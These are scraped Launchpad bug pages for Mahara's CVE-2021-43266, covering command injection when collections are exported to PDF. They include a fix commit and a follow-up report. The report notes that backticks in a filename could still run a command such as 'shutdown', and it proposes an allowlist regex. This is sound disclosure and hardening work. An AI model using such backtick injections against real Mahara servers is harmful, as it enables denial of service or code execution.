Suggested description: In Mahara before 20.04.5, 20.10.3, 21.04.2, and 21.10.0, exporting collections via PDF export could cause code execution.
Reported by: Dominic Couture
Bug report: https://bugs.launchpad.net/mahara/+bug/1942903
CVE reference: TBC

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Mahara Bot (dev-mahara)](https://launchpad.net/~dev-mahara) wrote on 2021-10-29: |  |  | [#14](/mahara/%2Bbug/1942903/comments/14) |
| --- | --- | --- | --- |

Reviewed: <https://reviews.mahara.org/12204>

Committed: <https://git.mahara.org/mahara/mahara/commit/6c15801d04887e482b1f490d8acf6f7c52661eea>

Submitter: Robert Lyon (<email address hidden>)

Branch: 20.10\_STABLE

commit 6c15801d04887e482b1f490d8acf6f7c52661eea

Author: Robert Lyon <email address hidden>

Date: Thu Sep 23 09:48:23 2021 +1200

Security [bug 1942903](/bugs/1942903): PDF export can cause command injection vulnerability

When a person names a collection in a certain way the title can be

executed when merging the PDF pages into one collection PDF

Change-Id: Iccca05291d79fe634b40cca11dcc9153a412ab86

Signed-off-by: Robert Lyon <email address hidden>

(cherry picked from commit ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd)

(cherry picked from commit 79442bf3879049a5e49f4c1891bbd26570ac27a8)

Reviewed: https://reviews.mahara.org/12204
Committed: https://git.mahara.org/mahara/mahara/commit/6c15801d04887e482b1f490d8acf6f7c52661eea
Submitter: Robert Lyon (robertl@catalyst.net.nz)
Branch: 20.10\_STABLE
commit 6c15801d04887e482b1f490d8acf6f7c52661eea
Author: Robert Lyon <robertl@catalyst.net.nz>
Date: Thu Sep 23 09:48:23 2021 +1200
Security bug 1942903: PDF export can cause command injection vulnerability
When a person names a collection in a certain way the title can be
executed when merging the PDF pages into one collection PDF
Change-Id: Iccca05291d79fe634b40cca11dcc9153a412ab86
Signed-off-by: Robert Lyon <robertl@catalyst.net.nz>
(cherry picked from commit ff1a3446f5c2a4c0ca35a0f1470d9483d028efdd)
(cherry picked from commit 79442bf3879049a5e49f4c1891bbd26570ac27a8)

[See full activity log](https://bugs.launchpad.net/mahara/%2Bbug/1942903/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/mahara/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/mahara/%2Bbug/1942903/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/mahara/%2Bbug/1942903/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/mahara/%2Bbug/1942903/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Bug attachments

* [2021-09-06 08-22-12.mp4](https://bugs.launchpad.net/mahara/%2Bbug/1942903/%2Battachment/5523517/%2Bfiles/2021-09-06%2008-22-12.mp4)
  [Edit](/mahara/%2Bbug/1942903/%2Battachment/5523517 "Change attachment details")

* [Add attachment](/mahara/%2Bbug/1942903/%2Baddcomment)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
6394e03
([Get the code!](https://dev.launchpad.net/))



=== Content from bugs.launchpad.net_906adbc8_20250114_225615.html ===

[Log in / Register](https://bugs.launchpad.net/mahara/%2Bbug/1949527/%2Blogin)

[![](https://launchpadlibrarian.net/302557383/mahara_64x64.png)](https://launchpad.net/mahara)

## [Mahara](https://launchpad.net/mahara)

* [Overview](https://launchpad.net/mahara)
* [Code](https://code.launchpad.net/mahara)
* [Bugs](https://bugs.launchpad.net/mahara)
* [Blueprints](https://blueprints.launchpad.net/mahara)
* [Translations](https://translations.launchpad.net/mahara)
* [Answers](https://answers.launchpad.net/mahara)

# Avoid command injection when PDF bulk export is enabled

Bug #1949527 reported by
[Robert Lyon](https://launchpad.net/~robertl-9)
on 2021-11-02

[256](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [Mahara](https://bugs.launchpad.net/mahara) | Fix Released | High | [Robert Lyon](https://launchpad.net/~robertl-9) | [Mahara 22.04.0](https://launchpad.net/mahara/%2Bmilestone/22.04.0) |
|  | [20.10](https://bugs.launchpad.net/mahara/20.10) | Fix Released | High | Unassigned | [Mahara 20.10.4](https://launchpad.net/mahara/%2Bmilestone/20.10.4) |
|  | [21.04](https://bugs.launchpad.net/mahara/21.04) | Fix Released | High | Unassigned | [Mahara 21.04.3](https://launchpad.net/mahara/%2Bmilestone/21.04.3) |
|  | [21.10](https://bugs.launchpad.net/mahara/21.10) | Fix Released | High | Unassigned | [Mahara 21.10.1](https://launchpad.net/mahara/%2Bmilestone/21.10.1) |
|  | [22.04](https://bugs.launchpad.net/mahara/22.04) | Fix Released | High | [Robert Lyon](https://launchpad.net/~robertl-9) | [Mahara 22.04.0](https://launchpad.net/mahara/%2Bmilestone/22.04.0) |

### Bug Description

The patch <https://git.mahara.org/mahara/mahara/-/commit/6c15801d04887e482b1f490d8acf6f7c52661eea>

doesn't avoid a filename with backticks and a simple command like

`shutdown` could still be executed.

I have to say I didn't test it

though but I wanted to give a heads-up. I think exploitation is fairly

limited now but it could still be used as a denial of service.

I would highly recommend using a whitelist instead of trying to remove

all special characters, something like preg\_replace('/[^a-zA-Z0-9\_]/',

'-', ...) would make it easier and wouldn't require an exhaustive list

of all potentially malicious characters.

All the best,

Dominic

This is a follow on from [Bug 1942903](/bugs/1942903)

## CVE References

* [2021-43266](/bugs/cve/2021-43266 "In Mahara before 20.04.5, 20.10.3, 21...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Robert Lyon (robertl-9)](https://launchpad.net/~robertl-9) wrote on 2021-11-02: |  |  | [#1](/mahara/%2Bbug/1949527/comments/1) |
| --- | --- | --- | --- |

<https://reviews.mahara.org/#/c/12220/>

https://reviews.mahara.org/#/c/12220/

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kristina Hoeppner (kris-hoeppner)](https://launchpad.net/~kris-hoeppner) wrote on 2021-11-04: |  |  | [#2](/mahara/%2Bbug/1949527/comments/2) |
| --- | --- | --- | --- |

Follow-on from <https://mahara.org/interaction/forum/topic.php?id=8953> - use same CVE and description as there for this issue here as it is hardening. Dominic stays for the credit. We'll also need to update MITRE with the additional bug number for the CVE once this bug has been released.

Follow-on from https://mahara.org/interaction/forum/topic.php?id=8953 - use same CVE and description as there for this issue here as it is hardening. Dominic stays for the credit. We'll also need to update MITRE with the additional bug number for the CVE once this bug has been released.

[Robert Lyon (robertl-9)](https://launchpad.net/~robertl-9)
on 2022-02-09

| **information type**: | Private Security → Public Security |
| --- | --- |

[See full activity log](https://bugs.launchpad.net/mahara/%2Bbug/1949527/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/mahara/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/mahara/%2Bbug/1949527/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/mahara/%2Bbug/1949527/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/mahara/%2Bbug/1949527/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
6394e03
([Get the code!](https://dev.launchpad.net/))


